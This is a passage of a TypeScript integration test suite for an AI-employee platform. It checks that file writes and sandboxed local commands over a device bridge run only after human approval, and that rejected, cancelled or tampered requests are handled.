import { createHash, randomUUID } from 'node:crypto';
import {
  readFile,
  readdir,
  mkdtemp,
  mkdir,
  realpath,
  writeFile,
  rm,
} from 'node:fs/promises';
import { createServer } from 'node:http';
import { spawn } from 'node:child_process';
import { once } from 'node:events';
import { createRequire } from 'node:module';
import { tmpdir } from 'node:os';
import { join, resolve } from 'node:path';
import type * as Playwright from '../../../apps/worker/node_modules/playwright-core/index.js';
import { dependencyFixture } from '../../../apps/rice-bridge/test/dependency-fixture.js';

import {
  BridgeCommandPayloadSchema,
  BridgeDeviceSchema,
  RuntimeOperationSnapshotSchema,
  type BridgeCommandPayload,
  type RequestContext,
  type RuntimeActionBinding,
  EmployeeExecutionSnapshotSchema,
  ExecutionContextSchema,
  RuntimeLocalCommandResultSchema,
  localCommandToolchainImageV1,
} from '@allrice/contracts';
import postgres from 'postgres';
import {
  afterAll,
  afterEach,
  beforeAll,
  describe,
  expect,
  it,
  vi,
} from 'vitest';
import {
  createLocalCommandOperation,
  listLocalCommandOperations,
  cancelLocalCommandRun,
  waitLocalCommandOperation,
} from './local-command-service.ts';
import {
  localServiceUserAction,
  localServiceWorkerAction,
} from './local-service-runtime.ts';
import { reportLocalCommandProfile } from './local-command-profile.ts';
import { LocalCommandRunner } from '../../../apps/rice-bridge/src/local-command-runner.js';
import { BridgeJournal } from '../../../apps/rice-bridge/src/journal.js';
import { RuntimeBridgeOperationClient } from '../../../apps/rice-bridge/src/operation-client.js';
import { createRuntimeBridgeHttpHandler } from '../../../apps/web/lib/bridge/operation-http.js';
import { LocalStorageAdapter } from '../../storage/src/local.ts';
import { riceManifest } from './employees/employee-config.ts';
import { sendChatMessage } from './workspace/service.ts';
import { claimNextJob, cancelRun } from './execution/queue.ts';
import { runClaimedJob } from '../../../apps/worker/src/job-runner.js';
import { executeEmployeeRun } from '../../../apps/worker/src/jobs/employee-run.js';
import { listChangesetRuns } from './changeset-service.ts';
import { gate, p24Fixture } from '../../../apps/worker/test/p24/fixture.js';
import {
  claimConversationSteer,
  consumeConversationSteer,
  deferConversationSteer,
} from './conversation/conversation-input.ts';
import { releaseConversationRuntime } from './conversation/conversation-runtime.ts';
import { getInteractionStatus } from './conversation/interaction-status.ts';
import { assertReviewRunCurrent } from './conversation/review-continuation.ts';
import type * as DatabaseClient from './core/client.ts';
vi.mock('./core/client.ts', async (original) => ({
  ...(await original<typeof DatabaseClient>()),
  getDatabase: () => database,
}));
import {
  publishWorkbenchArtifact,
  listWorkbenchArtifacts,
  getWorkbenchArtifact,
  readArtifactBytes,
  saveArtifactFeedback,
  listArtifactFeedback,
  addressArtifactFeedback,
  parseChangesetBytes,
  ArtifactReviewError,
} from './artifact-review.ts';
import {
  createToolBrokerExportObject,
  registerToolBrokerExport,
} from './execution/tool-broker.ts';

import { createGovernedBridgeOperationLedger } from './runtime-governed-bridge.ts';
import {
  decideRuntimeActionApproval,
  getRuntimeActionApproval,
  requestRuntimeActionApproval,
  runtimePolicyDigest as digest,
  setRuntimePolicyControls,
} from './runtime-policy.ts';

const suite =
  process.env.ALLRICE_RUN_DB_INTEGRATION === '1'
    ? describe.sequential
    : describe.skip;
const artifactRoots: string[] = [];
let admin: ReturnType<typeof postgres>;
let database: ReturnType<typeof postgres>;
const schema = `runtime_bridge_test_${randomUUID().replaceAll('-', '')}`;

async function fixture(
  effect: 'allow' | 'ask' | 'deny' = 'ask',
  chat = false,
  root = true,
  makeSnapshot?: (ids: {
    employeeId: string;
    versionId: string;
    assignmentId: string;
    org: string;
    workspace: string;
    user: string;
    policy: string;
  }) => unknown,
  manifest?: unknown,
) {
  const org = randomUUID(),
    workspace = randomUUID(),
    user = randomUUID(),
    run = randomUUID();
  const policy = randomUUID(),
    membership = randomUUID(),
    deviceId = randomUUID(),
    grant = randomUUID(),
    target = randomUUID();
  const context: RequestContext = {
    actor: { type: 'user', id: user },
    organizationId: org,
    workspaceId: workspace,
    requestId: randomUUID(),
    sessionId: randomUUID(),
    memberships: [],
    authenticatedAt: new Date().toISOString(),
  };
  const policyPayload = {
    memberships: [
      {
        id: membership,
        userId: user,
        organizationId: org,
        workspaceId: workspace,
        role: 'admin' as const,
        active: true,
      },
    ],
    grants: [
      { resourceType: 'job', action: 'job:execute', workspaceId: workspace },
    ],
  };
  const employeeId = randomUUID(),
    versionId = randomUUID(),
    assignmentId = randomUUID(),
    sessionId = randomUUID();
  const executionSpec = { employeeVersionId: chat ? versionId : null };
  await database.begin(async (tx) => {
    await tx`insert into allrice_users(id,email,display_name,password_hash) values(${user},${`${user}@example.test`},'B1 assembly','not-login')`;
    await tx`insert into allrice_organizations(id,slug,name) values(${org},${`assembly-${org}`},'B1 assembly')`;
    await tx`insert into allrice_workspaces(id,organization_id,slug,name) values(${workspace},${org},'test','B1 assembly')`;
    await tx`insert into allrice_memberships(id,organization_id,workspace_id,user_id,role) values(${membership},${org},${workspace},${user},'admin')`;
    await tx`insert into allrice_policy_snapshots(id,organization_id,subject_id,version,payload,expires_at)
      values(${policy},${org},${user},1,${tx.json(policyPayload)},clock_timestamp()+interval '1 hour')`;
    await tx`insert into allrice_runs(id,organization_id,workspace_id,owner_id,state,policy_snapshot_id,execution_spec,input)
      values(${run},${org},${workspace},${user},'running',${policy},${tx.json(executionSpec)},'{}')`;
    await tx`insert into allrice_bridge_devices(id,organization_id,workspace_id,owner_id,name,platform,protocol_version,capabilities,token_hash,last_seen_at)
      values(${deviceId},${org},${workspace},${user},'B1 device','macos-x64',2,array['local.fs.write','local.fs.list'],${digest(deviceId).slice(7)},clock_timestamp())`;
    await tx`insert into allrice_bridge_folder_grants(id,organization_id,workspace_id,owner_id,device_id,label,root_fingerprint)
      values(${grant},${org},${workspace},${user},${deviceId},'B1 root',${'a'.repeat(64)})`;
    await tx`insert into allrice_execution_targets(id,organization_id,workspace_id,target_key,kind,label,state,capabilities,metadata)
      values(${target},${org},${workspace},${`bridge.${deviceId}`},'rice_bridge','B1 device','online',
        ${tx.json(['files.read', 'files.write'])},${tx.json({ bridgeDeviceId: deviceId })})`;
    if (chat) {
      await tx`insert into allrice_employees(id,organization_id,workspace_id,employee_key,name)
        values(${employeeId},${org},${workspace},'assembly','B1 employee')`;
      await tx`insert into allrice_employee_versions(id,organization_id,workspace_id,employee_id,version,name,model,system_prompt,capabilities,config_checksum,manifest)
        values(${versionId},${org},${workspace},${employeeId},1,'B1 frozen employee','synthetic','synthetic','[]',${digest('employee')},${tx.json(JSON.parse(JSON.stringify(manifest ?? {})))})`;
      await tx`insert into allrice_employee_assignments(id,organization_id,workspace_id,employee_id,employee_version_id,user_id)
        values(${assignmentId},${org},${workspace},${employeeId},${versionId},${user})`;
      await tx`insert into allrice_chat_sessions(id,organization_id,workspace_id,owner_id,title,employee_assignment_id,employee_version_id)
        values(${sessionId},${org},${workspace},${user},'B1 chat',${assignmentId},${versionId})`;
      const userMessage = randomUUID(),
        assistantMessage = randomUUID();
      await tx`insert into allrice_messages(id,organization_id,workspace_id,session_id,owner_id,role,content)
        values(${userMessage},${org},${workspace},${sessionId},${user},'user','{"text":"synthetic request","citations":[]}'),
          (${assistantMessage},${org},${workspace},${sessionId},${user},'assistant','{"text":"synthetic answer","citations":[]}')`;
      await tx`insert into allrice_employee_runs(run_id,organization_id,workspace_id,owner_id,employee_assignment_id,
        employee_version_id,session_id,user_message_id,assistant_message_id,provider_snapshot,prompt_snapshot,execution_snapshot)
        values(${run},${org},${workspace},${user},${assignmentId},${versionId},${sessionId},${userMessage},${assistantMessage},'{}','{}',
          ${tx.json(JSON.parse(JSON.stringify(makeSnapshot?.({ employeeId, versionId, assignmentId, org, workspace, user, policy }) ?? {})))})`;
      await tx`insert into allrice_conversation_runtimes(organization_id,workspace_id,session_id,owner_id,thread_generation,config_checksum,state,active_run_id,worker_id)
        values(${org},${workspace},${sessionId},${user},3,${digest('runtime')},'running',${run},${randomUUID()})`;
    }
  });
  await setRuntimePolicyControls(
    context,
    {
      version: 1,
      enabled: true,
      mode: 'execute',
      rules: [
        { action: 'local.fs.write', effect },
        { action: 'local.fs.list', effect },
      ],
    },
    null,
    database,
  );
  const now = new Date().toISOString();
  const device = BridgeDeviceSchema.parse({
    id: deviceId,
    organizationId: org,
    workspaceId: workspace,
    ownerId: user,
    name: 'B1 device',
    platform: 'macos-x64',
    protocolVersion: 2,
    capabilities: ['local.fs.write', 'local.fs.list'],
    status: 'online',
    lastSeenAt: now,
    createdAt: now,
    revokedAt: null,
  });
  const task = {
    scope: { organizationId: org, workspaceId: workspace, projectId: null },
    runId: run,
    rootRunId: run,
    parentRunId: null,
    chatSessionId: chat ? sessionId : null,
    frozenConfiguration: {
      employeeVersionId: executionSpec.employeeVersionId,
      digest: digest(executionSpec),
    },
  };
  const ledger = () =>
    createGovernedBridgeOperationLedger(device, { database });
  if (root)
    await ledger().createRoot({
      task,
      deadlineAt: new Date(Date.now() + 3_600_000).toISOString(),
      budgets: [
        {
          metric: 'tool_calls',
          unit: 'calls',
          currency: null,
          capacity: 100,
          source: { kind: 'bridge', sourceId: deviceId },
        },
      ],
    });
  function operation(
    raw: BridgeCommandPayload = {
      capability: 'local.fs.write',
      arguments: {
        path: 'test.txt',
        content: 'synthetic',
        expectedSha256: null,
      },
    },
  ) {
    const payload = BridgeCommandPayloadSchema.parse(raw);
    const binding: RuntimeActionBinding = {
      task,
      attempt: {
        operationId: randomUUID(),
        attemptId: randomUUID(),
        attemptNumber: 1,
        generation: chat ? 3 : 0,
        fence: 1,
      },
      requestedBy: { type: 'user', id: user },
      policy: { snapshotId: policy, digest: digest(policyPayload) },
      execution: {
        targetId: target,
        targetKind: 'rice_bridge',
        deviceId,
        grantId: grant,
        grantVersion: 1,
        scopeDigest: `sha256:${'a'.repeat(64)}`,
        workCopy: { id: grant, kind: 'in_place' },
      },
      action: payload.capability,
      inputDigest: digest(payload),
      dataScope: [],
      baseline: [],
      command: null,
    };
    const input = {
      snapshot: RuntimeOperationSnapshotSchema.parse({
        contractVersion: 1,
        binding,
        stepId: null,
        agentInstanceId: null,
        processId: null,
        cancelRequestId: null,
        idempotencyKey: randomUUID(),
        status: 'planned',
        result: null,
      }),
      bridgePayload: payload,
      reservations: [
        {
          metric: 'tool_calls' as const,
          accountingId: randomUUID(),
          amount: 1,
        },
      ],
    };
    const factory = () =>
      createGovernedBridgeOperationLedger(device, {
        database,
        initialOperation: {
          binding: input.snapshot.binding,
          payload: input.bridgePayload,
        },
      });
    async function approve() {
      const req = await requestRuntimeActionApproval(
        ledger().policyOptions,
        input.snapshot.binding,
        600_000,
        database,
      );
      await decideRuntimeActionApproval(
        context,
        req.approvalId,
        {
          contractVersion: 1,
          direction: 'response',
          kind: 'action_approval',
          requestId: req.requestId,
          version: req.version,
          requestDigest: req.requestDigest,
          task: req.task,
          responseId: randomUUID(),
          respondedBy: user,
          respondedAt: new Date().toISOString(),
          approvalId: req.approvalId,
          decision: 'approved',
        },
        database,
      );
      return req;
    }
    return { input, factory, approve };
  }
  const claim = () =>
    ledger().claimNextBridgeOperation({
      scope: task.scope,
      deviceId,
      leaseMs: 30_000,
    });
  return {
    context,
    device,
    task,
    ledger,
    operation,
    claim,
    grant,
    target,
    run,
    policy,
    membership,
    sessionId,
    versionId,
    employeeId,
    assignmentId,
    policyPayload,
  };
}

async function commandFixture(
  toolNames = ['local.process.execute'],
  manifest?: unknown,
  network = false,
) {
  vi.stubEnv('ALLRICE_LOCAL_COMMAND_ENABLED', '1');
  vi.stubEnv('ALLRICE_RUNTIME_POLICY_ENABLED', '1');
  vi.stubEnv('ALLRICE_BRIDGE_OPERATION_LEDGER_ENABLED', '1');
  const now = new Date().toISOString();
  const capabilities = [
    'model:invoke',
    'storage:read',
    'storage:write',
    ...(network ? ['network:outbound'] : []),
  ];
  const f = await fixture(
    'allow',
    true,
    false,
    (ids) => {
      const frozen = EmployeeExecutionSnapshotSchema.parse({
        schemaVersion: 1,
        employee: {
          id: ids.employeeId,
          versionId: ids.versionId,
          key: 'fixture',
          revision: 1,
          definitionChecksum: digest('fixture'),
          definition: {
            schemaVersion: 1,
            key: 'fixture',
            name: 'P05 Fixture',
            description: 'Synthetic tests only',
            systemPrompt: 'Synthetic tests only',
            provider: {
              provider: 'basic',
              authMode: 'none',
              model: 'allrice/basic-assistant-v1',
              reasoningEffort: 'none',
              sandbox: 'none',
            },
            capabilities,
            skillVersionIds: [],
          },
        },
        assignment: {
          id: ids.assignmentId,
          userId: ids.user,
          assignedBy: ids.user,
          assignedAt: now,
        },
        runtimePolicy: {
          harness: 'dsh',
          provider: 'openai-codex',
          model: 'fixture',
          reasoningEffort: 'high',
          timeoutMs: 300000,
          fallbackModels: [],
          credentialReference: 'test:never-resolved',
        },
        capabilitySnapshot: {
          declaredCapabilities: capabilities,
          grantedCapabilities: capabilities,
          bindings: {
            skillVersionIds: [],
            toolNames,
            knowledgeScopes: ['workspace'],
            workflowIds: [],
          },
          skillBindings: [],
        },
        tenantContext: {
          organizationId: ids.org,
          workspaceId: ids.workspace,
          actorId: ids.user,
          policySnapshotId: ids.policy,
        },
        userProfile: {
          schemaVersion: 1,
          displayName: 'P05 synthetic',
          preferences: {},
        },
        createdAt: now,
      });
      return frozen;
    },
    manifest,
  );
  const jobId = randomUUID(),
    workerId = randomUUID();
  await database`insert into allrice_jobs(id,organization_id,workspace_id,owner_id,run_id,status,idempotency_key,timeout_at,payload,worker_id,lease_token,claimed_at,heartbeat_at,lease_expires_at)
    values(${jobId},${f.context.organizationId},${f.context.workspaceId},${f.context.actor.id},${f.run},'running',${randomUUID()},clock_timestamp()+interval '5 minutes','{"schemaVersion":1,"type":"allrice.employee.run","input":{}}',
      ${workerId},${randomUUID()},clock_timestamp(),clock_timestamp(),clock_timestamp()+interval '5 minutes')`;
  await setRuntimePolicyControls(
    f.context,
    {
      version: 2,
      enabled: true,
      mode: 'execute',
      rules: [{ action: 'local.process.execute', effect: 'allow' }],
    },
    1,
    database,
  );
  const imageDigest =
    process.env.ALLRICE_LOCAL_DOCKER_TEST_IMAGE ?? localCommandToolchainImageV1;
  await reportLocalCommandProfile(
    f.device,
    {
      contractVersion: 1,
      backend: 'local-vm-container-v1',
      imageDigest,
      architecture: 'amd64',
      available: true,
    },
    database,
  );
  const execution = ExecutionContextSchema.parse({
    executionId: randomUUID(),
    runId: f.run,
    jobId,
    worker: { type: 'worker', id: workerId },
    delegatedBy: f.context.actor,
    organizationId: f.context.organizationId,
    workspaceId: f.context.workspaceId,
    policySnapshot: {
      id: f.policy,
      organizationId: f.context.organizationId,
      subjectId: f.context.actor.id,
      version: 1,
      issuedAt: now,
      expiresAt: new Date(Date.now() + 3_600_000).toISOString(),
      ...f.policyPayload,
    },
    startedAt: now,
  });
  const args = {
    executable: '/usr/local/bin/node',
    args: ['test.mjs'],
    path: '.',
    files: [{ path: 'test.mjs', sha256: digest('synthetic') }],
    limits: {
      timeoutMs: 10000,
      outputBytes: 8192,
      memoryMiB: 128,
      cpuMillis: 500,
      pids: 32,
    },
  };
  const create = (callId = 'p05-call', argumentsInput: unknown = args) =>
    createLocalCommandOperation(
      { context: execution, arguments: argumentsInput, callId },
      database,
    );
  const claim = (supportsLocalCommand = true) =>
    f.ledger().claimNextBridgeOperation({
      scope: f.task.scope,
      deviceId: f.device.id,
      leaseMs: 30000,
      supportsLocalCommand,
    });
  async function approve(decision: 'approved' | 'rejected' = 'approved') {
    const [op] = await listLocalCommandOperations(f.context, f.run, database);
    const req = op!.approval!.request;
    return decideRuntimeActionApproval(
      f.context,
      req.approvalId,
      {
        contractVersion: 1,
        direction: 'response',
        kind: 'action_approval',
        requestId: req.requestId,
        version: req.version,
        requestDigest: req.requestDigest,
        task: req.task,
        responseId: randomUUID(),
        respondedBy: f.context.actor.id,
        respondedAt: new Date().toISOString(),
        approvalId: req.approvalId,
        decision,
      },
      database,
    );
  }
  return { ...f, execution, args, create, claim, approve, imageDigest };
}

suite('B1 production Bridge authority assembly / real PostgreSQL', () => {
  afterEach(() => vi.unstubAllEnvs());
  it.each([
    'approve',
    'reject',
    'cancel_before_dispatch',
    'cancel_late_result',
  ] as const)(
    'P24 actual native child → exact P04 approval → HTTP Bridge → durable result: %s',
    async (scenario) => {
      const f = await fixture();
      const directory = await mkdtemp(join(tmpdir(), 'allrice-p24-bridge-'));
      artifactRoots.push(directory);
      const project = join(await realpath(directory), 'project');
      await mkdir(project);
      const fingerprint = createHash('sha256').update(project).digest('hex');
      await database`update allrice_bridge_folder_grants set root_fingerprint=${fingerprint} where id=${f.grant}`;
      const [grant] =
        await database`select runtime_generation from allrice_bridge_folder_grants where id=${f.grant}`;
      const op = f.operation({
        capability: 'local.fs.write',
        arguments: {
          path: 'p24.txt',
          content: 'reviewed P24 synthetic result',
          expectedSha256: null,
        },
      });
      op.input.snapshot.binding.execution.grantVersion =
        grant!.runtime_generation;
      op.input.snapshot.binding.execution.scopeDigest = `sha256:${fingerprint}`;
      const nativeRoot = randomUUID(),
        nativeChild = randomUUID();
      op.input.snapshot.agentInstanceId = nativeChild;
      const submitted = gate(),
        completion = gate();
      let proposalCalls = 0;
      const native = await p24Fixture(
        async (request) =>
          request.messages.at(-1)?.role === 'user' &&
          JSON.stringify(request.messages.at(-1)).includes(
            'Request the synthetic reviewed operation.',
          )
            ? { tool: { marker: 'exact-reviewed-proposal' } }
            : { text: 'Result received.' },
        async (proposal) => {
          proposalCalls++;
          // Server-selected binding; no tenant/run/tool/path authority comes from
          // model arguments. P25 must persist this native→platform identity map.
          expect(proposal).toMatchObject({
            childId: nativeChild,
            parentId: nativeRoot,
            marker: 'exact-reviewed-proposal',
            nativeOutcome: 'rejected',
          });
          expect((await op.factory().createOperation(op.input)).status).toBe(
            'waiting_user',
          );
          submitted.release();
          await completion.promise;
          const result = await f
            .ledger()
            .readOperation(
              f.task.scope,
              op.input.snapshot.binding.attempt.operationId,
            );
          return {
            status: result.status,
            result: result.result,
            approvalRequired: true,
          };
        },
      );
      const handler = createRuntimeBridgeHttpHandler({
        enabled: () => true,
        authenticate: async (token) => {
          if (token !== 'p24-synthetic-device') throw Error('unauthorized');
          return {
            device: f.device,
            grants: [
              {
                id: f.grant,
                deviceId: f.device.id,
                label: 'P24 test only',
                rootFingerprint: fingerprint,
                createdAt: new Date().toISOString(),
                revokedAt: null,
              },
            ],
          };
        },
        ledgerForDevice: async () => f.ledger(),
      });
      const server = createServer((req, res) => {
        void (async () => {
          const chunks: Buffer[] = [];
          for await (const c of req) chunks.push(Buffer.from(c));
          const path = new URL(req.url!, 'http://localhost').pathname;
          const response = await handler(
            new Request(`http://localhost${path}`, {
              method: 'POST',
              headers: {
                authorization: String(req.headers.authorization ?? ''),
                'content-type': 'application/json',
              },
              body: Buffer.concat(chunks),
            }),
            path.split('/').at(-1)! as
              'next' | 'start' | 'receipts' | 'heartbeat' | 'output',
            path.split('/').at(-2),
          );
          res.statusCode = response.status;
          res.end(await response.text());
        })().catch(() => {
          res.statusCode = 500;
          res.end();
        });
      });
      server.listen(0, '127.0.0.1');
      await once(server, 'listening');
      const origin = `http://127.0.0.1:${(server.address() as { port: number }).port}`;
      const journal = await BridgeJournal.open({
        directory: join(directory, 'journal'),
        server: origin,
        deviceId: f.device.id,
      });
      const bridge = new RuntimeBridgeOperationClient({
        config: {
          server: origin,
          deviceId: f.device.id,
          deviceName: 'P24 synthetic',
          grants: [
            {
              id: f.grant,
              label: 'P24',
              rootPath: project,
              rootFingerprint: fingerprint,
            },
          ],
        },
        token: 'p24-synthetic-device',
        journal,
      });
      const c = native.launch();
      try {
        await c.call('ready');
        await c.call('create', { id: nativeRoot });
        await c.call('start', {
          parentId: nativeRoot,
          id: nativeChild,
          text: 'Request the synthetic reviewed operation.',
        });
        await submitted.promise;
        expect(await bridge.pollOnce()).toBe(false);
        await expect(readFile(join(project, 'p24.txt'))).rejects.toMatchObject({
          code: 'ENOENT',
        });
        const approval = await requestRuntimeActionApproval(
          f.ledger().policyOptions,
          op.input.snapshot.binding,
          600_000,
          database,
        );
        const response = {
          contractVersion: 1 as const,
          direction: 'response' as const,
          kind: 'action_approval' as const,
          requestId: approval.requestId,
          version: approval.version,
          requestDigest: approval.requestDigest,
          task: approval.task,
          responseId: randomUUID(),
          respondedBy: f.context.actor.id,
          respondedAt: new Date().toISOString(),
          approvalId: approval.approvalId,
          decision:
            scenario === 'reject'
              ? ('rejected' as const)
              : ('approved' as const),
        };
        await expect(
          decideRuntimeActionApproval(
            f.context,
            approval.approvalId,
            { ...response, requestDigest: digest('tampered') },
            database,
          ),
        ).rejects.toThrow();
        await decideRuntimeActionApproval(
          f.context,
          approval.approvalId,
          response,
          database,
        );
        if (scenario === 'cancel_before_dispatch')
          await f.ledger().cancelRoot(f.task.scope, f.run, randomUUID());
        const executed = await bridge.pollOnce();
        expect(executed).toBe(
          scenario === 'approve' || scenario === 'cancel_late_result',
        );
        if (executed) {
          expect(await readFile(join(project, 'p24.txt'), 'utf8')).toBe(
            'reviewed P24 synthetic result',
          );
          expect(
            (
              await f
                .ledger()
                .readOperation(
                  f.task.scope,
                  op.input.snapshot.binding.attempt.operationId,
                )
            ).status,
          ).toBe('succeeded');
          expect(
            (
              await getRuntimeActionApproval(
                f.context,
                approval.approvalId,
                database,
              )
            ).consumedAt,
          ).not.toBeNull();
        } else
          await expect(
            readFile(join(project, 'p24.txt')),
          ).rejects.toMatchObject({ code: 'ENOENT' });
        if (scenario === 'cancel_late_result') {
          await f.ledger().cancelRoot(f.task.scope, f.run, randomUUID());
          await c.call('drain', { id: nativeRoot });
        }
        completion.release();
        const adoptedResult = () =>
          native.requests.find((request) =>
            request.messages.some(
              (message) =>
                message.role === 'tool' &&
                JSON.stringify(message.content).includes('approvalRequired'),
            ),
          );
        if (scenario !== 'cancel_late_result')
          await expect.poll(adoptedResult, { timeout: 15_000 }).toBeDefined();
        await c.close();
        expect(proposalCalls).toBe(1);
        if (scenario === 'cancel_late_result')
          expect(native.requests).toHaveLength(1);
        if (scenario === 'approve')
          expect(JSON.stringify(adoptedResult())).toContain('succeeded');
        expect(await bridge.pollOnce()).toBe(false);
        const second = f.operation();
        if (scenario.startsWith('cancel')) {
          await expect(
            second.factory().createOperation(second.input),
          ).rejects.toThrow('root_canceled');
        }
      } finally {
        completion.release();
        await native.close();
        await journal.close();
        server.closeAllConnections();
        await new Promise<void>((r) => server.close(() => r()));
      }
    },
    45_000,
  );
  beforeAll(async () => {
    if (!process.env.ALLRICE_TEST_DATABASE_URL)
      throw Error('ALLRICE_TEST_DATABASE_URL required');
    admin = postgres(process.env.ALLRICE_TEST_DATABASE_URL, {
      max: 2,
      onnotice: () => {},
    });
    await admin.begin(async (tx) => {
      await tx`select pg_advisory_xact_lock(20260907, 1)`;
      await tx`create extension if not exists vector with schema public`;
      await tx`create extension if not exists pg_trgm with schema public`;
    });
    await admin.unsafe(`create schema ${schema}`);
    const url = new URL(process.env.ALLRICE_TEST_DATABASE_URL);
    url.searchParams.set('options', `-csearch_path=${schema},public`);
    database = postgres(url.toString(), { max: 12, onnotice: () => {} });
    const migrations = new URL('../migrations/', import.meta.url);
    for (const file of (await readdir(migrations))
      .filter((f) => f.endsWith('.sql'))
      .sort())
      await database.unsafe(await readFile(new URL(file, migrations), 'utf8'));
    // Delays only explicitly named synthetic operations, after normal admission.
    await database`create table b1_test_write_delay(operation_id uuid primary key,event_kind text not null)`;
    await database.unsafe(`create function b1_test_event_delay() returns trigger language plpgsql as $$
      begin
        if exists(select 1 from b1_test_write_delay where operation_id=new.operation_id
          and event_kind=new.payload->'signal'->>'type') then perform pg_sleep(0.8); end if;
        return new;
      end; $$;
      create trigger b1_test_event_delay before insert on allrice_runtime_operation_events
        for each row execute function b1_test_event_delay();
      create function b1_test_lease_delay() returns trigger language plpgsql as $$
      begin
        if new.lease_expires_at is distinct from old.lease_expires_at
          and exists(select 1 from b1_test_write_delay where operation_id=new.id and event_kind='lease_update')
          then perform pg_sleep(0.8); end if;
        return new;
      end; $$;
      create trigger b1_test_lease_delay before update on allrice_runtime_operations
        for each row execute function b1_test_lease_delay();`);
  }, 60_000);
  afterAll(async () => {
    for (const root of artifactRoots)
      await rm(root, { recursive: true, force: true });
    await database?.end();
    if (admin) {
      if (!/^runtime_bridge_test_[a-f0-9]{32}$/.test(schema))
        throw Error('invalid isolated schema');
      await admin.unsafe(`drop schema ${schema} cascade`);
      await admin.end();
    }
  });
  async function artifactFixture(manifest?: unknown) {
    vi.stubEnv('ALLRICE_WORKBENCH_ENABLED', '1');
    const f = await commandFixture(
      ['workspace.export.create', 'local.process.execute'],
      manifest,
    );
    const root = await mkdtemp(join(tmpdir(), 'allrice-p06-artifacts-'));
    artifactRoots.push(root);
    const storage = new LocalStorageAdapter(root);
    const publish = (
      callId = 'publish',
      text = 'first line\nsecond line',
      parentObjectId?: string,
      kind: 'document' | 'plan' | 'changeset' = 'document',
    ) =>
      publishWorkbenchArtifact(
        {
          context: f.execution,
          sessionId: f.sessionId,
          callId,
          kind,
          fileName: kind === 'changeset' ? 'changeset.json' : 'fixture.txt',
          format: kind === 'changeset' ? 'json' : 'text',
          bytes: Buffer.from(text),
          mediaType: kind === 'changeset' ? 'application/json' : 'text/plain',
          ...(parentObjectId ? { parentObjectId } : {}),
          changeSummary: 'Synthetic revision',
        },
        storage,
        database,
      );
    const draft = (
      artifact: Awaited<ReturnType<typeof publish>>,
      text = 'Revise this line',
    ) => ({
      feedbackId: randomUUID(),
      artifactId: artifact.id,
      checksum: artifact.object.checksum,
      expectedRevision: 0,
      comments: [
        {
          id: randomUUID(),
          anchor: {
            kind: 'lines',
            path: null,
            side: 'after',
            startLine: 2,
            endLine: 2,
            checksum: artifact.object.checksum,
          },
          text,
        },
      ],
    });
    return { ...f, root, storage, publish, draft };
  }
  it.each([
    'restore',
    'partial',
    'partial_cancel',
    'restore_conflict',
    'reject',
    'expire',
    'cancel',
  ] as const)(
    'P08 real message → Worker → approval → HTTP Bridge / files / recovery: %s',
    async (scenario) => {
      vi.stubEnv('ALLRICE_CHANGESET_ENABLED', '1');
      const manifest = riceManifest();
      if (manifest.schemaVersion !== 2) throw Error('v2 fixture required');
      manifest.capabilityBindings.toolNames.push('local.fs.write');
      const f = await artifactFixture(manifest);
      f.context.memberships = f.policyPayload.memberships;
      const skillId = randomUUID();
      await database`insert into allrice_dsh_skills(id,organization_id,workspace_id,name,description,content,checksum,required_tool_refs,created_by) values(${skillId},${f.context.organizationId},${f.context.workspaceId},'p08-write-fixture','Synthetic only','Synthetic file editing',${digest('Synthetic file editing')},'["local.fs.write"]',${f.context.actor.id})`;
      await database`insert into allrice_employee_dsh_skill_bindings(organization_id,workspace_id,employee_id,skill_id,bound_by) values(${f.context.organizationId},${f.context.workspaceId},${f.employeeId},${skillId},${f.context.actor.id})`;
      vi.stubEnv('ALLRICE_STORAGE_ROOT', f.root);
      const root = join(await realpath(f.root), 'project');
      await mkdir(root);
      const fingerprint = createHash('sha256').update(root).digest('hex');
      await database`update allrice_bridge_folder_grants set root_fingerprint=${fingerprint} where id=${f.grant}`;
      const side = (text: string) => ({
        text,
        checksum: `sha256:${createHash('sha256').update(text).digest('hex')}`,
      });
      const [grant] =
        await database`select runtime_generation from allrice_bridge_folder_grants where id=${f.grant}`;
      const proposal = {
        contractVersion: 1,
        comparisonScope: 'changeset',
        execution: {
          ...f.operation().input.snapshot.binding.execution,
          grantVersion: grant!.runtime_generation,
          scopeDigest: `sha256:${fingerprint}`,
        },
        files: [
          {
            path: 'test.mjs',
            before: null,
            after: side('console.log("P08 project passed");'),
          },
          { path: 'README.md', before: side('old'), after: side('reviewed') },
        ],
      };
      await writeFile(join(root, 'README.md'), 'old');
      const a = await f.publish(
        'p08-proposal',
        JSON.stringify(proposal),
        undefined,
        'changeset',
      );
      await database`update allrice_runs set state='succeeded' where id=${f.run}`;
      await database`update allrice_jobs set status='succeeded' where run_id=${f.run}`;
      await database`update allrice_conversation_runtimes set state='idle',active_run_id=null,worker_id=null where session_id=${f.sessionId}`;
      await setRuntimePolicyControls(
        f.context,
        {
          version: 3,
          enabled: true,
          mode: 'execute',
          rules: [{ action: 'local.fs.changeset', effect: 'allow' }],
        },
        2,
        database,
      );
      const handler = createRuntimeBridgeHttpHandler({
        enabled: () => true,
        authenticate: async (token) => {
          if (token !== 'p08-synthetic-device') throw Error('unauthorized');
          return {
            device: f.device,
            grants: [
              {
                id: f.grant,
                deviceId: f.device.id,
                label: 'P08 synthetic',
                rootFingerprint: fingerprint,
                createdAt: new Date().toISOString(),
                revokedAt: null,
              },
            ],
          };
        },
        ledgerForDevice: async () => f.ledger(),
      });
      let loseAck = true,
        heartbeats = 0,
        activeRunId = '';
      let js = '',
        css = '';
      const browserEnabled =
        scenario === 'restore' &&
        process.env.ALLRICE_WORKBENCH_BROWSER_TEST === '1';
      if (browserEnabled) {
        const require = createRequire(resolve('apps/worker/package.json'));
        const build = createRequire(require.resolve('tsx/package.json'))(
          'esbuild',
        ).build;
        const assets = await build({
          entryPoints: [resolve('apps/web/test/changeset-page.tsx')],
          bundle: true,
          write: false,
          outdir: f.root,
          platform: 'browser',
          format: 'iife',
          jsx: 'automatic',
          define: { 'process.env.NODE_ENV': '"production"' },
        });
        js = assets.outputFiles.find((x: { path: string }) =>
          x.path.endsWith('.js'),
        ).text;
        css = assets.outputFiles.find((x: { path: string }) =>
          x.path.endsWith('.css'),
        ).text;
      }
      const server = createServer((req, res) => {
        void (async () => {
          const chunks: Buffer[] = [];
          for await (const c of req) chunks.push(Buffer.from(c));
          const path = new URL(req.url!, 'http://localhost').pathname;
          if (path === '/') {
            res.setHeader('content-type', 'text/html');
            res.end(
